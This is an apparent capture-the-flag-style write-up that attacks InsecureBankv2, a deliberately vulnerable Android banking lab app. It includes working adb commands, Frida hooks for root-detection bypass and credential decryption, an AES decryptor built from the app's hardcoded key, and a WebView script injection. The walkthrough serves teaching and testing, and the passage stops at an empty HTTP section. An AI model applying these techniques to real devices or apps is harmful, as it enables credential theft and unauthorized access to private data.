---
title: "InsecureBankv2"
date: 2026-08-20
categories: [Mobile, Android]
tags: [android, mobile, insecurebankv2, adb, frida, mobsf, drozer, apktool, burp-suite, exported-activity, content-provider, insecure-storage, aes, hardcoded-key, allowbackup, debuggable, insecure-logging, webview, clipboard, cleartext-http, user-enumeration, CWE-532]
image:
  path: /assets/img/Mobile/InsecureBankv2/banner.png
  alt: InsecureBankv2 writeup
---

InsecureBankv2 is a deliberately vulnerable Android banking app that packs almost every mobile misconfiguration into one APK: exported components that bypass login, credentials stored under a hardcoded AES key, `allowBackup` and `debuggable` left on, cleartext logging and HTTP, an injectable WebView, and a parameter-tampering password change. Rather than a single chain to root, this is a catalogue of independent client-side and configuration flaws, each documented with its mechanism, exploitation.

| Field      | Details                       |
|------------|-------------------------------|
| Platform   | InsecureBankv2 (dineshshetty) |
| Type       | Android mobile application    |
| Emulator   | Genymotion — Google Nexus 5X  |
| OS         | Android 11 (API 30)           |
| Date       | August 2026                   |

## Tools Used

| Tool           | Description                                                                       |
|----------------|-----------------------------------------------------------------------------------|
| Genymotion     | Android emulator used to run the target device                                    |
| adb            | Android Debug Bridge — installs apps, runs shell commands, forwards ports, pulls files |
| MobSF          | Mobile Security Framework — automated static analysis and APK decompilation       |
| apktool        | Decompiles and rebuilds APKs, decoding resources and smali                        |
| keytool        | Generates the RSA keystore used to sign the rebuilt APK                            |
| zipalign       | Aligns APK entries on 4-byte boundaries for optimal loading                       |
| apksigner      | Signs and verifies the rebuilt APK                                                 |
| Frida          | Dynamic instrumentation toolkit — hooks and rewrites methods at runtime           |
| pidcat         | Colour-coded per-application `logcat` wrapper                                      |
| android-backup-extractor (abe) | Converts Android `.ab` backup archives into standard tar files    |
| sqlite3        | Reads the app's SQLite databases                                                  |
| Burp Suite     | Intercepting proxy used to read and tamper with the app's HTTP traffic            |
| pycryptodome   | Python AES implementation used to decrypt the stored password offline             |

## Setup & Deployment

The objective of this phase was to stand up the target: a Genymotion virtual device running the app, talking to the AndroLab backend server on the host.

Following the author's usage guide, I emulated a **Google Nexus 5X** on **Android 11 (API 30)** with Genymotion. The device boots to a stock launcher, and the host-only adapter puts it on the `192.168.56.0/24` network — the address the app and the backend will use to reach each other.

![Genymotion Nexus 5X virtual device booted to the launcher](/assets/img/Mobile/InsecureBankv2/cap1.png)

The application ships with a Python backend (AndroLab). It targets Python 2.7, so I ran it inside a dedicated virtualenv:

```bash
(.venv2) ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2/AndroLabServer$ python app.py
The server is hosted on port: 8888
```

With the server listening on `8888`, I connected to the device over adb and installed the APK. The key detail here is `adb reverse`, which maps a port on the device back to the host — so when the app later dials `8888`, the device forwards that connection to the AndroLab server running on my machine.

```bash
ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ adb devices
List of devices attached
192.168.56.101:5555	device

ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ adb reverse tcp:8888 tcp:8888
8888

ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ adb install InsecureBankv2.apk
Performing Streamed Install
Success
```

Since `adb` drives almost every step in this writeup, it's worth pinning down what each invocation does. `adb` is the command-line bridge to an Android device or emulator; the subcommands used throughout are:

- `adb devices` — lists attached devices by their `ip:port` (Genymotion exposes the device over TCP).
- `adb reverse tcp:8888 tcp:8888` — reverse port forward: connections the **device** makes to `localhost:8888` are tunnelled to `localhost:8888` on the **host**. The mirror image of `adb forward`.
- `adb install <apk>` — installs an APK on the device.
- `adb shell <cmd>` — runs a command inside the device's Unix shell (or drops into an interactive shell with no argument).
- `adb pull <remote> <local>` / `adb exec-out <cmd>` — copies files off the device; `exec-out` streams raw binary without the line-ending mangling `adb shell` introduces.
- `adb push <local> <remote>` — copies files onto the device.
- `adb backup <pkg>` — triggers a full backup of an app's private data.
- `adb uninstall <pkg>` — removes an app.

The lab provides two sets of valid credentials:

- `dinesh:Dinesh@123$`
- `jack:Jack@123$`

Inside the app, I pointed the network preferences at the server IP `192.168.56.1` on port `8888` and logged in as `dinesh` to confirm the device and backend were talking to each other.

![InsecureBankv2 login screen with Login and Autofill Credentials buttons](/assets/img/Mobile/InsecureBankv2/cap2.png)

## Static Analysis with MobSF

The objective here was to decompile the APK once and get an at-a-glance inventory of the attack surface — permissions, exported components, and the manifest flags — before touching any single vulnerability.

MobSF automates decompilation, manifest parsing, and source-level issue detection. I ran it as a container, pointing its dynamic analyzer at the running Genymotion instance:

```bash
docker pull opensecurity/mobile-security-framework-mobsf:latest
docker run -it --name mobsf --network host \
  -e MOBSF_ANALYZER_IDENTIFIER=192.168.56.101:5555 \
  opensecurity/mobile-security-framework-mobsf:latest
```

With the container up, I browsed to `localhost:8000` (default credentials `mobsf:mobsf`) and uploaded `InsecureBankv2.apk`. The dashboard immediately flags the shape of the problem: a low security score, and — most importantly — a count of **exported components**.

![MobSF static analysis dashboard showing exported activities, receivers and providers](/assets/img/Mobile/InsecureBankv2/cap3.png)

MobSF reports **4 exported activities, 1 exported receiver, and 1 exported content provider**. In Android, a component marked `exported="true"` (or one with an intent filter and no explicit `exported=false`) can be invoked by **any other app on the device**. That single fact drives several of the vulnerabilities below.

Viewing the decoded `AndroidManifest.xml` confirms the two most dangerous application-level flags and the exported components:

```xml
<application android:allowBackup="true" android:debuggable="true" ...>
    <activity android:name="com.android.insecurebankv2.LoginActivity">
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/>
        </intent-filter>
    </activity>
    <activity android:exported="true" android:name="com.android.insecurebankv2.PostLogin"/>
    <activity android:exported="true" android:name="com.android.insecurebankv2.DoTransfer"/>
    <activity android:exported="true" android:name="com.android.insecurebankv2.ViewStatement"/>
    <provider android:authorities="com.android.insecurebankv2.TrackUserContentProvider"
              android:exported="true"
              android:name="com.android.insecurebankv2.TrackUserContentProvider"/>
    <receiver android:exported="true" android:name="com.android.insecurebankv2.MyBroadCastReceiver">
        <intent-filter>
            <action android:name="theBroadcast"/>
        </intent-filter>
    </receiver>
    <activity android:exported="true" android:name="com.android.insecurebankv2.ChangePassword"/>
</application>
```

Two flags stand out immediately, and both feed dedicated sections later: `android:allowBackup="true"` and `android:debuggable="true"`. Alongside them, `PostLogin`, `DoTransfer`, `ViewStatement`, `ChangePassword`, the `TrackUserContentProvider`, and the `MyBroadCastReceiver` are all reachable from outside the app.

## Activity Login Bypass

**Objective**: reach the authenticated area of the app without supplying valid credentials.

An Android *activity* is a single screen of the UI. Normally the app's own flow decides which activity comes next — you can only reach `PostLogin` after `LoginActivity` validates your credentials. But `PostLogin` is exported, and exported activities can be launched directly by anyone, short-circuiting whatever logic was supposed to gate them.

The name is a strong hint: "PostLogin" is the screen shown *after* login. I launched it straight from adb:

```bash
adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin
```

Here `am` is the device's Activity Manager and `start -n <package>/<component>` launches a specific activity by its fully-qualified name. The screen that appears — Transfer, View Statement, Change Password — is exactly the post-authentication dashboard, reached without ever passing through the login form.

![PostLogin activity reached directly, showing Transfer, View Statement and Change Password](/assets/img/Mobile/InsecureBankv2/cap4.png)


## Exported Content Provider

**Objective**: read the app's internal user-tracking database from outside the app.

A content provider is Android's mechanism for sharing structured data (usually backed by SQLite) between apps. `TrackUserContentProvider` is exported, and its source shows it wraps a `names` table inside the `mydb` database:

```java
public class TrackUserContentProvider extends ContentProvider {
    static final String CREATE_DB_TABLE = " CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL);";
    static final String DATABASE_NAME = "mydb";
    static final String TABLE_NAME = "names";
    static final String URL = "content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers";
    ...
}
```

Because the provider is exported with no read permission declared, any app on the device can query it via its `content://` URI and pull the list of users that have logged in — usernames that should never have left the app's sandbox. The same `names` table resurfaces later, extracted through two other independent flaws (backup and `run-as`), which is a recurring theme in this app: one piece of sensitive data, several unguarded doors to it.


## Patching the APK — Hidden "Create User" Button

**Objective**: force a hidden admin-only UI element to appear by tampering with a static resource baked into the APK.

`LoginActivity.onCreate()` reads a string resource named `is_admin` and hides the "Create User" button when it equals `"no"`:

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_log_main);
    String mess = getResources().getString(R.string.is_admin);
    if (mess.equals("no")) {
        View button_CreateUser = findViewById(R.id.button_CreateUser);
        button_CreateUser.setVisibility(8);   // 8 = View.GONE
    }
    ...
}
```

The crucial detail is *where* `is_admin` lives. It is not a server-side flag or anything that travels over the network — it's a **static resource hardcoded inside the APK** at `/res/values/strings.xml`, always equal to `"no"`. Anything hardcoded in the APK is fully under an attacker's control, because the APK is just a file on disk that can be unpacked, edited, and repacked.

I decompiled the APK with apktool:

```bash
ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ apktool d InsecureBankv2.apk -o InsecureBankv2_patched
I: Using Apktool 2.7.0-dirty on InsecureBankv2.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Baksmaling classes.dex...
I: Copying assets and libs...
```

`apktool d <apk> -o <dir>` decodes the APK into a folder: resources are turned back into readable XML and the Dalvik bytecode into smali. The `is_admin` string sat exactly where the source implied:

```bash
ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ cat InsecureBankv2_patched/res/values/strings.xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello world!</string>
    <string name="is_admin">no</string>
    <string name="loginscreen_password">Password:</string>
</resources>
```

I flipped the value to `yes` and rebuilt the APK:

```bash
ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ apktool b InsecureBankv2_patched -o InsecureBankv2_patched.apk
I: Using Apktool 2.7.0-dirty
I: Smaling smali folder into classes.dex...
I: Building resources...
I: Building apk file...
I: Built apk into: InsecureBankv2_patched.apk
```

Android refuses to install an unsigned APK, and because the signing certificate changes, it also refuses to *update* the existing install — so the old copy has to be removed first. The modern signing flow is align-then-sign with `apksigner` (zipalign runs *before* signing, unlike the legacy jarsigner flow):

```bash
# a) Create a keystore (once). Note the password.
keytool -genkey -v -keystore mi.keystore -alias miclave \
  -keyalg RSA -keysize 2048 -validity 10000

# b) Align on 4-byte boundaries BEFORE signing
zipalign -p -f -v 4 InsecureBankv2_patched.apk InsecureBankv2_aligned.apk

# c) Sign
apksigner sign --ks mi.keystore --ks-key-alias miclave \
  --out InsecureBankv2_signed.apk InsecureBankv2_aligned.apk

# d) Verify the signature
apksigner verify --verbose InsecureBankv2_signed.apk
```

- `keytool -genkey` builds a self-signed RSA-2048 keystore valid for 10000 days.
- `zipalign -p -f -v 4` aligns entries on 4-byte boundaries (`-p` for page-aligned shared libs, `-f` overwrite, `-v` verbose).
- `apksigner sign` signs the aligned APK with the keystore key.
- `apksigner verify` confirms the signature is valid.

Finally, uninstall the original and install the patched build:

```bash
adb uninstall com.android.insecurebankv2
adb install InsecureBankv2_signed.apk
```

The "Create User" button now renders on the login screen:

![Login screen now showing the previously hidden Create User button](/assets/img/Mobile/InsecureBankv2/cap5.png)

Honesty about impact: the button is cosmetic. Its handler is a stub:

```java
protected void createUser() {
    Toast.makeText(this, "Create User functionality is still Work-In-Progress!!", 1).show();
}
```

So this isn't a privilege escalation — it's a demonstration that **client-side flags are not a security boundary**. Any decision the client makes based on a value it ships (feature gating, "admin" toggles, license checks) can be inverted by repackaging. The lesson generalises far beyond this stub.


## Developer Backdoor Login

**Objective**: authenticate as a privileged account without knowing any password.

`DoLogin`'s `postData()` method builds two HTTP endpoints — the normal `/login` and a second `/devlogin` — and routes to the latter whenever the username is `devadmin`:

```java
HttpPost httppost  = new HttpPost(... + "/login");
HttpPost httppost2 = new HttpPost(... + "/devlogin");
...
if (DoLogin.this.username.equals("devadmin")) {
    httppost2.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    responseBody = httpclient.execute(httppost2);   // dev endpoint
} else {
    httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    responseBody = httpclient.execute(httppost);
}
```

The `/devlogin` endpoint accepts the `devadmin` user with **any password**. Logging in through the app as `devadmin` with an arbitrary password succeeds, and the server confirms it:

```json
{"message": "Correct Credentials", "user": "devadmin"}
```

This is a classic developer backdoor: a shortcut left in for testing that never got removed. The routing logic sits entirely client-side in the decompiled code, so even without knowing the endpoint existed, reading `DoLogin.java` reveals it.


## Insecure Credential Storage

**Objective**: recover a user's cleartext password from the app's local storage, defeating the "encryption" the developer thought protected it.

When a login succeeds, `DoLogin.saveCreds()` persists the credentials to a `SharedPreferences` file: the username is Base64-encoded and the password is passed through `CryptoClass.aesEncryptedString()`:

```java
private void saveCreds(String username, String password) throws ... {
    SharedPreferences mySharedPreferences = DoLogin.this.getSharedPreferences("mySharedPreferences", 0);
    SharedPreferences.Editor editor = mySharedPreferences.edit();
    ...
    String base64Username = new String(Base64.encodeToString(this.rememberme_username.getBytes(), 4));
    CryptoClass crypt = new CryptoClass();
    this.superSecurePassword = crypt.aesEncryptedString(this.rememberme_password);
    editor.putString("EncryptedUsername", base64Username);
    editor.putString("superSecurePassword", this.superSecurePassword);
    editor.commit();
}
```

The "Autofill Credentials" button on the login screen runs the reverse: it reads `mySharedPreferences`, Base64-decodes the username and decrypts the password to pre-fill the form. To find the file I logged in as `jack` (`jack:Jack@123$`) and searched the filesystem:

```bash
ander@monre:~/mobileHack/InsecureBankV2/Android-InsecureBankv2$ adb shell
vbox86p:/ # find / -name "mySharedPreferences*" 2>/dev/null
/data/user/0/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml
/data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml

vbox86p:/ # cat /data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="superSecurePassword">v/sJpihDCo2ckDmLW5Uwiw==&#10;    </string>
    <string name="EncryptedUsername">amFjaw==&#13;&#10;    </string>
</map>
```

The username is trivially recoverable — `amFjaw==` is Base64 for `jack`. The password is the AES ciphertext `v/sJpihDCo2ckDmLW5Uwiw==`. MobSF surfaced the class responsible, `CryptoClass.java`, and its source is the whole problem:

![MobSF source view of CryptoClass.java showing the hardcoded key and static IV](/assets/img/Mobile/InsecureBankv2/cap6.png)

```java
public class CryptoClass {
    String key = "This is the super secret key 123";
    byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    ...
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
}
```

Two fatal cryptographic anti-patterns sit in those two lines. The **key is hardcoded** into the app (`"This is the super secret key 123"`, 32 bytes → AES-256), so it ships with every copy of the APK and is identical for every user. The **IV is a static block of zero bytes**, which means identical plaintexts always produce identical ciphertexts. Encryption whose key is public and whose IV is constant provides no confidentiality — it's obfuscation, not cryptography. Anyone who reads the class (or decompiles the APK) has everything needed to decrypt every stored password on every device.

### Method 1 — Offline decryption with Python

Knowing the key, IV, and CBC mode, decryption is a few lines with `pycryptodome`:

```python
ander@monre:~/mobileHack/InsecureBankV2$ cat decryptor.py
from Crypto.Cipher import AES
from base64 import b64decode

iv = 16 * b'\x00'
key = b'This is the super secret key 123'

username = b64decode("amFjaw==").decode()
encrypted_password = b64decode("v/sJpihDCo2ckDmLW5Uwiw==")

cipher = AES.new(key, AES.MODE_CBC, iv)
password = cipher.decrypt(encrypted_password).decode()

print(f"{username}:{password}")

ander@monre:~/mobileHack/InsecureBankV2$ python3 decryptor.py
jack:Jack@123$
```

`Crypto` comes from the `pycryptodome` package (`pip install pycryptodome`), not the standard library — a `ModuleNotFoundError: No module named 'Crypto'` just means it isn't installed. The script Base64-decodes both fields, rebuilds the exact cipher the app used, and recovers `Jack@123$` in cleartext.

### Method 2 — Runtime decryption with Frida

The offline script needs the key and IV. A more powerful technique doesn't need them at all: instead of reimplementing the crypto, **make the app decrypt for us** using its own key material. `CryptoClass.aesDeccryptedString(String)` takes a ciphertext and returns the plaintext; with Frida I hooked it so that, whenever the app calls it (on "Autofill Credentials"), it ignores its real argument and decrypts *our* ciphertext instead:

```javascript
Java.perform(function () {
    var Crypto = Java.use("com.android.insecurebankv2.CryptoClass");

    // the encrypted password (base64) pulled from mySharedPreferences
    var encrypted = "v/sJpihDCo2ckDmLW5Uwiw==";

    Crypto.aesDeccryptedString.implementation = function (arg) {
        console.log("[+] argumento original de la app: " + arg);
        console.log("[+] lo sustituyo por: " + encrypted);

        // call the ORIGINAL method with OUR argument
        var result = this.aesDeccryptedString(encrypted);

        console.log("[+] PASSWORD DESCIFRADO: " + result);
        return result;
    };
});
```

The important line is `this.aesDeccryptedString(encrypted)`: unlike a hook that fabricates a return value, this one calls the *real* method — reusing the app's hardcoded key transparently — but feeds it the victim ciphertext. (The Frida server setup this relies on is covered in the Root Detection Bypass section below.) Running it and pressing "Autofill Credentials":

```bash
ander@monre:~/mobileHack/InsecureBankV2$ frida -U -n InsecureBankv2 -l decrypt.js
     ____
    / _  |   Frida 17.17.0 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |
   . . . .   Connected to Nexus 5X (id=192.168.56.102:5555)

[Nexus 5X::InsecureBankv2 ]-> [+] argumento original de la app: v/sJpihDCo2ckDmLW5Uwiw==
[+] lo sustituyo por: v/sJpihDCo2ckDmLW5Uwiw==
[+] PASSWORD DESCIFRADO: Jack@123$
```

The two methods reach the same result from opposite directions: one reimplements the cipher offline, the other borrows the app's own decryption routine at runtime. Frida's approach is the more general one — it works even when the key *isn't* trivially readable, because you never need to know it.


## Application Backup Enabled

**Objective**: exfiltrate the app's entire private data directory without root, via Android's backup mechanism.

The manifest leaves `android:allowBackup="true"`. This attribute is `true` by **default** if the developer doesn't explicitly set it to `false`, and it lets anyone with device access and USB debugging dump the app's private data directory (`/data/data/com.android.insecurebankv2/`) — normally sandboxed and inaccessible — through the legitimate `adb backup` channel.

```bash
adb backup com.android.insecurebankv2
```

This raises a confirmation prompt on the device, optionally letting you set a password to encrypt the backup (note it down — you need it to unpack). I confirmed the operation:

![Android full-backup confirmation dialog with an encryption password field](/assets/img/Mobile/InsecureBankv2/cap7.png)

The result is a `backup.ab` file. That format is not a plain tar — it has an Android-specific header and may be compressed/encrypted — so I converted it with [android-backup-extractor](https://github.com/nelenkov/android-backup-extractor), supplying the backup password:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ java -jar abe-38fd634.jar unpack backup.ab application-data.tar ander123
Calculated MK checksum (use UTF-8: true): 148018AA7D5C008DAE90B76DB1658CD87C666C4A675DE5DD2B42748B9EB1B2DA
22% 45% 58% 64% 67% 77%
27136 bytes written to application-data.tar.
```

`java -jar abe.jar unpack <in.ab> <out.tar> <password>` converts the `.ab` to a standard tar, which then extracts normally:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ tar xvf application-data.tar
apps/com.android.insecurebankv2/_manifest
apps/com.android.insecurebankv2/db/mydb-journal
apps/com.android.insecurebankv2/db/mydb
apps/com.android.insecurebankv2/sp/com.android.insecurebankv2_preferences.xml
apps/com.android.insecurebankv2/sp/mySharedPreferences.xml
```

The backup contains both `mySharedPreferences.xml` (the Base64 username and AES password from the previous section) and the `mydb` SQLite database (the user-tracking table). This is the same loot reachable through the content provider and `run-as`, obtained here without any root requirement — just physical access and USB debugging.

A realism note worth recording: on **Android 12+ (API 31)**, `adb backup` ignores app data by default even when `allowBackup=true`, so this attack only works on the older Android 11 target here. The flag is still a valid finding (defence-in-depth, MASVS-STORAGE), but its real-world exploitability depends on the target's OS version — a good example of capability versus practical exploitability.


## Debug Mode Enabled

**Objective**: read the app's private files by assuming the app's own identity, using the `run-as` binary that `debuggable=true` unlocks.

The manifest also leaves `android:debuggable="true"`. Unlike `allowBackup`, this defaults to `false` — the build tools set it automatically in release mode — so its presence means a developer left it on by hand. It unlocks two things: running commands *as the app* via `run-as`, and attaching a Java debugger over JDWP. This section covers the first (the debugger path was not needed here).

The Android sandbox gives each app its own Linux UID and makes `/data/data/<pkg>/` accessible only to that UID. The `run-as` binary lets you execute commands with an app's UID **provided the app is debuggable** — it checks that flag before allowing the impersonation. Because it's set here, `run-as` drops me straight into the app's private directory:

```bash
1|vbox86p:/ # run-as com.android.insecurebankv2
vbox86p:/data/user/0/com.android.insecurebankv2 $ ls -la
total 56
drwxr-x--x   6 u0_a130 u0_a130        4096 2026-08-19 16:23 .
drwxrwx--x 167 system  system        12288 2026-08-19 16:15 ..
drwxrws--x   2 u0_a130 u0_a130_cache  4096 2026-08-19 16:15 cache
drwxrws--x   2 u0_a130 u0_a130_cache  4096 2026-08-19 16:15 code_cache
drwxrwx--x   2 u0_a130 u0_a130        4096 2026-08-19 16:16 databases
drwxrwx--x   2 u0_a130 u0_a130        4096 2026-08-19 16:49 shared_prefs
```

From here I pulled the `mydb` database to my machine. Using `exec-out` rather than a plain `adb shell` cat matters — it streams the raw bytes without corrupting the SQLite file with line-ending translation:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ adb exec-out run-as com.android.insecurebankv2 cat databases/mydb > mydb
```

Opening the database confirms the user-tracking table — the same `names` table exposed by the content provider:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ sqlite3 mydb
SQLite version 3.46.1 2024-08-13 09:16:08
sqlite> .tables
android_metadata  names
sqlite> select * from names;
1|devadmin
2|devadmin
3|jack
sqlite> select * from android_metadata;
en_US
```

`run-as` (via debuggable), `adb backup` (via allowBackup), and the content provider all converge on this same data — three independent misconfigurations, one set of secrets. That redundancy is the real lesson: a mobile app hardened against one path but not the others is not hardened at all.


## Root Detection Bypass with Frida

**Objective**: defeat the app's root-detection check at runtime by rewriting the methods that implement it.

After a successful login, `PostLogin` shows "Rooted Device!!" — the emulator is rooted, and the app detects it via `doesSUexist()` and `doesSuperuserApkExist()`. If either returns `true`, the warning shows. The plan is to hook both and force `false`.

First, the Frida server has to run on the device. Frida has two halves that must match versions: `frida-tools` on the host, and `frida-server` (a root binary) on the device. I checked the device architecture and downloaded the matching server build:

```bash
adb shell getprop ro.product.cpu.abi
x86_64
```

The `x86_64` ABI (a Genymotion emulator) determines which server binary to fetch — it must match both the architecture and the host's Frida version (17.17.0). After decompressing it, I pushed it, made it executable, and launched it as root in the background:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ adb push frida-server /data/local/tmp/
frida-server: 1 file pushed, 0 skipped. 231.2 MB/s (111587168 bytes in 0.460s)

ander@monre:~/mobileHack/InsecureBankV2$ adb shell "chmod 755 /data/local/tmp/frida-server"
ander@monre:~/mobileHack/InsecureBankV2$ adb shell "su -c '/data/local/tmp/frida-server &'"

ander@monre:~/mobileHack/InsecureBankV2$ adb shell ps -A | grep frida
root           2760      1 11919096 140900 poll_schedule_timeout 7428a25b9a0a S frida-server
```

- `adb push` copies the binary to `/data/local/tmp/` (a writable, executable location).
- `chmod 755` sets the execute bit.
- `su -c '... &'` runs it as root in the background (Frida needs root to inject into other processes).

From the host, `frida-ps -U` confirms the client can talk to the server (`-U` selects the USB/emulator transport). A case-insensitive grep is needed because Frida lists the *display name* `InsecureBankv2`, not the lowercase package:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ frida-ps -U | grep -i insecure
2585  InsecureBankv2
```

The hook script replaces both boolean methods' implementations. Since the result the app expects is simply "not rooted", we don't call the originals at all — we return `false` outright:

```javascript
Java.perform(function () {
    var PostLogin = Java.use("com.android.insecurebankv2.PostLogin");

    PostLogin.doesSUexist.implementation = function () {
        console.log("[+] doesSUexist() interceptado -> false");
        return false;
    };

    PostLogin.doesSuperuserApkExist.implementation = function () {
        console.log("[+] doesSuperuserApkExist() interceptado -> false");
        return false;
    };
});
```

`Java.perform` runs the code on the VM's thread; `Java.use` loads a class; reassigning `.implementation` swaps the whole method body. I attached to the running app with `-n` (the root check fires *after* login, so attaching in time is easy):

```bash
ander@monre:~/mobileHack/InsecureBankV2$ frida -U -n InsecureBankv2 -l root_bypass.js
     ____
    / _  |   Frida 17.17.0 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |
   . . . .   Connected to Nexus 5X (id=192.168.56.102:5555)

[Nexus 5X::InsecureBankv2 ]->
```

After logging in with the hook loaded, the app now reports "Device not Rooted!!":

![PostLogin now displaying Device not Rooted after the Frida hook](/assets/img/Mobile/InsecureBankv2/cap8.png)

The broader point: **client-side root detection can always be neutralised on a device the attacker controls.** It raises the bar slightly but is never a security control — the code enforcing it runs in the same process the attacker is instrumenting.


## Insecure Logging

**Objective**: harvest credentials from the app's log output.

Several places in the code write to the Android log. `DoLogin`, on a successful login, logs the username and password in cleartext:

```java
if (DoLogin.this.result.indexOf("Correct Credentials") != -1) {
    Log.d("Successful Login:", ", account=" + DoLogin.this.username + ":" + DoLogin.this.password);
}
```

`pidcat` (a per-app `logcat` wrapper) filters the log stream down to just this app. Logging in as `jack` while it runs prints the credentials straight to the terminal:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ pidcat com.android.insecurebankv2
      Successful Login:  D  , account=jack:Jack@123$
```

Your intuition about who can see this matters here. Since **Android 4.1**, a third-party app can no longer read another app's logs without system-level permission — so the "any app reads the log" attack that existed pre-Jelly Bean is gone. But the sensitive data is still exposed to: anyone with physical access and USB debugging (as shown), apps running with root, and older or weakly-isolated devices where log separation is imperfect. The severity depends on the device context, but writing secrets to the log is a design flaw in itself — **CWE-532: Insertion of Sensitive Information into Log File**.


## Insecure WebView & External Storage

**Objective**: achieve JavaScript execution inside the app's WebView by overwriting a file it loads from world-writable external storage.

The `ViewStatement` activity loads an HTML statement into a WebView, from **external storage**, with JavaScript enabled:

```java
mWebView.loadUrl("file://" + Environment.getExternalStorageDirectory() + "/Statements_" + this.uname + ".html");
```

Two problems compound. External storage (`/storage/emulated/0/`) is readable and writable by any app (and by adb), so the file the WebView renders is not under the app's exclusive control. And JavaScript is enabled in the WebView, so any script in that file executes. First I confirmed the exact path by triggering a transfer and watching the log, which prints the location via `System.out`:

```bash
       cr_LibraryLoader  I  Loaded native library version number "83.0.4103.120"
       TetheringManager  I  registerTetheringEventCallback:com.android.insecurebankv2
             System.out  I  /storage/emulated/0/Statements_jack.html
```

The file lives at `/storage/emulated/0/Statements_jack.html`. Since it's world-writable, I replaced it with my own HTML containing a JavaScript payload — a simple `alert()` as proof of execution — and pushed it over adb:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ cat Statements_jack.html
<script>alert("HTML malipulado!");</script>

ander@monre:~/mobileHack/InsecureBankV2$ adb push Statements_jack.html /storage/emulated/0/
Statements_jack.html: 1 file pushed, 0 skipped. 0.1 MB/s (44 bytes in 0.001s)
```

Tapping "View Statement" now loads my file and executes the script:

![WebView rendering the injected HTML and firing the JavaScript alert dialog](/assets/img/Mobile/InsecureBankv2/cap9.png)

The `adb push` here just simulates the real attacker: a second, malicious app on the device with external-storage write permission. It overwrites the statement file, and the next time the victim opens their statement, the attacker's JavaScript runs **inside the banking app's WebView context** — where, depending on the WebView's configuration (`setAllowFileAccess`, any `addJavascriptInterface` bridges), it can reach the app's private files or exposed Java methods. It behaves like stored XSS, but the root cause is insecure content loading, not a server-side injection.


## Clipboard / Pasteboard Exposure

**Objective**: read data the user copied inside the app from the shared system clipboard — and observe how modern Android mitigates it.

Android's clipboard is global and shared across apps. Historically any app could instantiate a `ClipboardManager` and read whatever the user last copied — in a banking app, that's account numbers, amounts, sometimes passwords. To test it, I copied an account number (`5555555`) inside the transfer screen, found the app's Linux UID, and tried to read the clipboard through the low-level binder service call, impersonating the app with `su`:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ adb shell ps | grep "insecure"
u0_a130        3343    424 12801312 227504 ep_poll   72b6ff63a90a S com.android.insecurebankv2

ander@monre:~/mobileHack/InsecureBankV2$ adb shell su u0_a130 service call clipboard 1 s16 com.android.insecurebankv2
Result: Parcel(
  0x00000000: fffffffd 00000008 006f004e 00690020 '........N.o. .i.'
  0x00000010: 00650074 0073006d 00000000 00000318 't.e.m.s.........'
  ...
  '...at com.android.server.clipboard.ClipboardService...setPrimaryClip(...)'
  '...at android.os.Binder.execTransact(Binder.java:1123)' )
```

The `service call clipboard` invokes the clipboard system service directly over binder: `su u0_a130` runs as the app's UID (from the `ps` output above), and `s16 <pkg>` writes the calling package name as a UTF-16 string into the parcel. But the returned parcel isn't clipboard text — it's a **stack trace**, the marshalled form of a `SecurityException` thrown by `ClipboardService`. The `5555555` never appears.

That failure is the interesting result. From **Android 10 (API 29)** onward, the clipboard can only be read by the app that currently holds window focus, or by the active input method — precisely to kill the background-clipboard-sniffing attack. Impersonating the app's UID with `su` is no longer enough, because the service also checks for foreground focus. The exception you see *is* the mitigation doing its job. On the older Android used in the original walkthrough, this same command returned the copied text; on Android 11 here, it's blocked.

To actually observe the value on a modern device, the read must come from the app itself (which does hold focus). A Frida hook that instantiates the app's own `ClipboardManager` reads it without tripping the `SecurityException`:

```javascript
Java.perform(function () {
    var ActivityThread = Java.use("android.app.ActivityThread");
    var context = ActivityThread.currentApplication().getApplicationContext();

    var ClipboardManager = Java.use("android.content.ClipboardManager");
    var clipboard = Java.cast(context.getSystemService("clipboard"), ClipboardManager);

    if (clipboard.hasPrimaryClip()) {
        var clip = clipboard.getPrimaryClip();
        console.log("[+] Clipboard: " + clip.getItemAt(0).getText());
    } else {
        console.log("[-] Clipboard is empty");
    }
});
```

The capability-versus-exploitability framing captures this cleanly: the original clipboard vulnerability (any app reads copied data) was real and serious, Android 10+ restricted reads to the focused app so the `service call` route now raises `SecurityException`, and it remains exploitable only on older devices or from the app itself / a malicious input method.


## Insecure HTTP Connections

**Objective**: intercept the app's traffic in cleartext by routing it through an intercepting proxy.

